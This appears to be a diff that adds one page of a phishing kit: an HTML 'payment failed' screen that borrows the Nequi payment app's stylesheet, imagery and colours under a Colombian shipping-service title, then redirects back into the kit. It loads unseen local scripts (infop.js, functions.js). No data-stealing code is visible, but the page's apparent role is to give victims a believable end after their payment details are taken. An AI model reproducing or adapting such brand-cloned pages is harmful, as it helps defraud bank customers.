@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>El servicio de envíos de Colombia</title>
+    <meta http-equiv="content-type" content="text/html; utf-8">
+    <meta charset="utf-8">
+    <meta content="es" http-equiv="Content-Language">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="Copyright" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="img/favicon.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>  
+    <script src="../../../js/functions.js"></script>
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/stylesheet.css" rel="stylesheet">
+    <link href="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/css/nequi-colombia.f1656e402.min.css" rel="stylesheet" type="text/css" />
+    <link href="https://fonts.googleapis.com" rel="preconnect" />
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous" />
+    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        WebFont.load({
+            google: {
+                families: ["Montserrat:100,200,300,400,500,600,700,800,900", "Manrope:400,500,600,700,800"]
+            }
+        });
+    </script>
+    <style type="text/css">
+        body {
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Nunito', sans-serif;
+        }
+        
+        #cargando {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 920;   
+            display: none; 
+        }
+        
+        .error-container {
+            text-align: center;
+            margin-bottom: 10px; /* Ajusta el margen inferior para subir la imagen */
+        }
+        
+        .error-container img {
+            width: 100px;
+            margin-bottom: 40px;
+        }
+        
+        .error-message {
+            font-weight: bold;
+            font-size: 18px;
+            color: #000;
+            margin-bottom: 10px;
+            white-space: pre-line; /* Permite que las palabras se alineen una debajo de otra */
+        }
+
+        .message-container p {
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 40px;
+            white-space: pre-line; /* Asegura que el texto se divida en dos líneas */
+        }
+
+        .btn-container {
+            text-align: center;
+            width: 100%;
+        }
+        
+        .btn-deshabilitado {
+            background-color: #DA0081;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 320px; /* Botón más largo */
+        }
+    </style>          
+</head>
+<body>
+    <img src="img/preloader2.gif" id="cargando" width="110" alt="Cargando...">
+    
+    <div class="error-container">
+        <img src="img/nequi-cara-triste.svg" alt="Cara triste">
+        <p class="error-message">¡Ups!, no se pudo<br> <br>completar el pago!</p>
+    </div>
+
+    <div class="message-container">
+        <p>En estos momentos no se pudo realizar el<br>pago, por favor intenta más tarde.</p>
+    </div>
+    
+    <div class="btn-container">
+        <button class="btn-deshabilitado" id="btn-consultar">Cancelar</button>
+    </div>
+    
+
+    <script>
+        document.getElementById("btn-consultar").addEventListener("click", function() {
+            window.location.href = "../../../index2.html";
+        }); 
+    </script>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/infop.js"></script>
+</body>
+</html>
